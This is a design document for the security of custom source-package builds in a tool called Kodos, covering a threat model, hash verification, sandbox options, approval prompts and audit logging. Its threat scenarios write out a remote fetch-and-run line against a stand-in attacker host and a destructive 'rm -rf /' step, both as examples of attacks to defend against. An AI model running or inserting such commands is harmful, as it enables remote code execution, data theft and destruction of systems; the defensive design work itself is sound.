# Phase 5: Custom Package Security Design

**Document:** Architecture redesign support
**Phase:** 5
**Status:** Design - Review Required
**Last Updated:** 2026-09-09

---

## Overview

Phase 5 enables users to define and build custom packages from source. This introduces security risks:

- **Untrusted source code** — Downloaded URLs could be compromised
- **Arbitrary build scripts** — Build commands could execute malicious code
- **System pollution** — Poorly built packages could corrupt system

This document defines security strategy and user workflows.

---

## Threat Model

### Actors

1. **Trusted User**
   - Controls the Kodos config file
   - Knows what packages to build
   - Can review package definitions

2. **Attacker (CVE)**
   - Compromises upstream source (github, ftp, etc.)
   - Injects malicious code in tarball
   - Builds execute attacker's code

3. **Attacker (Config Injection)**
   - Compromises Kodos config file
   - Injects malicious package definitions
   - User doesn't notice before running `kod install`

### Attack Scenarios

#### Scenario 1: Compromised Upstream
```
User defines:
  source = "https://github.com/myapp/myapp/archive/v1.0.tar.gz"

Attacker:
  - Compromises github account
  - Replaces v1.0.tar.gz with malicious version
  - Build script executes: rm -rf / (or more subtle attack)

Impact:
  - System corrupted during build
```

**Mitigation:**
- Source hash verification (SHA256)
- Manual review of build commands
- Sandboxed builds

#### Scenario 2: Trojanized Build Template
```
User uses custom build template:
  ~/.kod/plugins/build_templates/evil.lua
  
Template returns:
  { "cd $src", "make", "curl attacker.com/exfil.sh | bash" }

Impact:
  - Attacker exfiltrates build secrets
  - Attacker gains access during build
```

**Mitigation:**
- Only allow builtin templates by default
- Explicit approval for custom templates
- Audit trail of custom templates used

#### Scenario 3: Malicious Config
```
Attacker:
  - Modifies user's config.lua
  - Adds malicious package: execute shell command
  
User:
  - Runs: kod install
  - Doesn't notice new packages in config
  - Malicious code runs
```

**Mitigation:**
- Config validation shows added packages
- Diff before install
- Approval workflow

---

## Security Architecture

### 1. Source Hash Verification

**Requirement:** All custom packages MUST have hash verification

```lua
custom_packages = {
  {
    name = "hello",
    version = "2.12",
    source = "https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz",
    source_hash = "sha256:abc123...",  -- REQUIRED
    template = "autotools",
  }
}
```

**Implementation:**
```python
def verify_source(url, download_path, expected_hash):
    """Download and verify source hash."""
    download(url, download_path)
    actual_hash = sha256(download_path)
    if actual_hash != expected_hash:
        raise SourceVerificationError(
            f"Source hash mismatch for {url}\n"
            f"Expected: {expected_hash}\n"
            f"Actual: {actual_hash}\n\n"
            f"Possible causes:\n"
            f"  - Source file changed\n"
            f"  - Network corruption\n"
            f"  - Attacker tampering"
        )
```

**User workflow:**
1. Download source manually
2. Compute hash: `sha256sum hello-2.12.tar.gz`
3. Copy hash to config
4. Kodos verifies on build

### 2. Build Sandbox (Optional, Recommended)

**Approach:** Run builds in isolated environment

**Options:**

#### Option A: Bubblewrap (Lightweight)
```python
# kod/system/packages_custom.py
def build_custom_package(pkg_def):
    """Build package in bubblewrap sandbox."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Setup sandbox
        sandbox = bubblewrap.Sandbox(
            rootfs="/",
            writable_paths=[tmpdir],  # Only tmpdir is writable
            readonly_paths=["/"],
            bind_paths={"/sys", "/proc"},  # System needs these
        )
        
        # Run build inside sandbox
        with sandbox.enter():
            for cmd in build_commands:
                exec_in_sandbox(cmd)
            
            # Copy result out
            copy_result_to_cache(tmpdir)
```

**Pros:**
- Lightweight
- Doesn't require containers
- Good enough for package builds

**Cons:**
- Still has access to /sys, /proc
- If sandbox breaks, attacker has full access

#### Option B: Nix (Heavy)
Run build in Nix sandbox (reproducible builds).

**Pros:**
- Reproducible
- Deterministic

**Cons:**
- Heavy dependency
- Overkill for MVP

#### Option C: User Approval Only (MVP)
Don't sandbox initially. Instead:
- Show build commands to user
- Require explicit approval
- Log all commands executed

**Pros:**
- Simple (MVP)
- User has final say

**Cons:**
- User might not understand commands
- Can be faster than sandbox

**Recommendation:** Start with Option C (MVP), add Option A later

### 3. Build Commands Review

**Requirement:** User reviews build commands before execution

```
About to build custom package 'hello' v2.12

Source: https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz
Template: autotools
Build flags: --prefix=/usr --enable-nls

Build commands:
  1. cd /tmp/hello-build
  2. /tmp/hello/configure --prefix=/usr --enable-nls
  3. make
  4. make install DESTDIR=/tmp/hello-install

Review these commands. Do you want to proceed? [y/N]
```

**Implementation:**
```python
def build_with_approval(pkg_def):
    """Build package with user approval."""
    # Generate commands
    commands = template.generate_commands(pkg_def)
    
    # Show to user
    print(f"Building {pkg_def['name']} v{pkg_def['version']}")
    print(f"Source: {pkg_def['source']}")
    print("\nBuild commands:")
    for i, cmd in enumerate(commands, 1):
        print(f"  {i}. {cmd}")
    
    # Get approval
    response = input("\nProceed with build? [y/N] ")
    if response.lower() != 'y':
        raise UserCancelled("Build cancelled by user")
    
    # Execute (sandboxed or not)
    execute_build(commands)
```

### 4. Audit Trail

**Requirement:** Log all custom package builds

```
# ~/.kod/package-build.log
2026-09-09 10:15:32 [BUILD] hello v2.12
  source: https://ftp.gnu.org/gnu/hello/hello-2.12.tar.gz
  source_hash: sha256:abc123...
  template: autotools
  status: SUCCESS
  output: /home/user/.kod/packages/cache/hello-2.12.tar.gz

2026-09-09 10:20:15 [BUILD] myapp v1.0
  source: https://github.com/user/myapp/archive/v1.0.tar.gz
  source_hash: sha256:def456...
  template: cmake
  status: FAILED
  error: Build failed with exit code 1
  output: (saved to /tmp/myapp-build.log)
```

**Implementation:**
```python
def log_build(pkg_def, status, output, error=None):
    """Log package build to audit trail."""
    log_entry = {
        'timestamp': datetime.now(),
        'name': pkg_def['name'],
        'version': pkg_def['version'],
        'source': pkg_def['source'],
        'source_hash': pkg_def.get('source_hash'),
        'template': pkg_def['template'],
        'status': status,
        'output_path': output,
        'error': error,
    }
    
    with open(LOG_FILE, 'a') as f:
        json.dump(log_entry, f)
        f.write('\n')
```

### 5. Cache Integrity

**Requirement:** Verify cached packages haven't been tampered with

```python
def get_cached_package(pkg_def):
    """Get package from cache, verify integrity."""
    cache_path = get_cache_path(pkg_def)
    
    if not cache_path.exists():
        return None
    
    # Verify cache metadata
    metadata = load_metadata(cache_path)
    
    # Check if source has changed
    if metadata['source'] != pkg_def['source']:
        logger.warning(f"Source changed for {pkg_def['name']}, clearing cache")
        cache_path.unlink()
        return None
    
    # Check if hash changed
    if metadata['source_hash'] != pkg_def.get('source_hash'):
        logger.warning(f"Source hash changed for {pkg_def['name']}, clearing cache")
        cache_path.unlink()
        return None
    
    # Check if build flags changed
    if metadata['build_flags'] != pkg_def.get('build_flags'):
        logger.info(f"Build flags changed for {pkg_def['name']}, cache invalidated")
        cache_path.unlink()
        return None
    
    return cache_path
```

---

## User Workflows

### Workflow 1: First Custom Package

```
1. User defines custom package in config.lua
2. Run: kod config validate -c config.lua
   → Validates package definition
   → Shows what will be built
3. User reviews package definition
4. Run: kod package build -n hello
   → Downloads source
   → Verifies hash
   → Shows build commands
   → Waits for approval
   → Runs build
   → Caches result
5. Run: kod install
   → Uses cached package
```

### Workflow 2: Update Cached Package

```
1. User changes build flags for existing package
2. Run: kod config validate
   → Detects change
3. Run: kod rebuild
   → Detects cache invalidation
   → Rebuilds package with new flags
   → Updates cache
   → Applies changes
```

### Workflow 3: Compromised Source

```
1. User's source is compromised upstream
2. Source hash changes
3. Run: kod package build -n hello
   → Download fails hash verification
   → Error: "Source hash mismatch! Possible tampering."
   → Build aborted
   → User investigates
```

---

## Implementation Plan

### Phase 5a: MVP (Weeks 8-8.5)
- [x] Custom package schema (with source_hash)
- [x] Source hash verification
- [x] Build command generation
- [x] User approval workflow (no sandbox)
- [x] Basic caching
- [x] Audit logging

**Security posture:** User controls what's built, all builds logged

### Phase 5b: Enhanced (Weeks 8.5-9)
- [ ] Sandbox with bubblewrap (optional)
- [ ] Cache integrity verification
- [ ] Better error messages
- [ ] Security documentation

**Security posture:** Builds isolated, tampering detected

### Phase 5c: Future
- [ ] Nix sandbox integration
- [ ] Plugin security sandboxing
- [ ] Binary signing
- [ ] Package registry / marketplace

---

## Security Checklist (Before Phase 5 Merge)

- [ ] Source hash verification implemented
- [ ] User approval workflow implemented
- [ ] Audit logging implemented
- [ ] Cache integrity checking implemented
- [ ] Error messages are clear and actionable
- [ ] Security documentation written (this file)
- [ ] Security tests pass (tampering detected, hash mismatch caught)
- [ ] Code review by security-conscious reviewer
- [ ] User documentation includes security best practices

---

## Best Practices (User Facing)

**Document to include in SECURITY.md:**

1. **Always verify source hashes**
   - Download package manually if possible
   - Compute hash with `sha256sum`
   - Compare against published hash on upstream website

2. **Review build commands**
   - Kodos shows build commands before execution
   - Never approve commands you don't understand
   - If in doubt, build manually and inspect

3. **Protect your config file**
   - Keep `configuration.lua` in version control
   - Review diffs before running `kod rebuild`
   - Don't paste untrusted configs

4. **Use official sources**
   - Prefer upstream project URLs (github, ftp.gnu.org)
   - Avoid mirrors or third-party repackaging
   - Check HTTPS certificates

5. **Monitor builds**
   - Kodos logs all builds to `~/.kod/package-build.log`
   - Review log for unexpected builds
   - Investigate build failures

---

## Decision: MVP Approach

**Recommendation:** Implement MVP (Phase 5a) with:
- ✅ Source hash verification (mandatory)
- ✅ User approval (required before build)
- ✅ Audit logging (all builds recorded)
- ❌ Sandbox (add in Phase 5b if needed)

**Rationale:**
- Addresses 80% of threat model
- Simple implementation
- User has final control
- Can add sandbox later
- Shipping faster

**To proceed:** Approve this design and add to Phase 5 spec

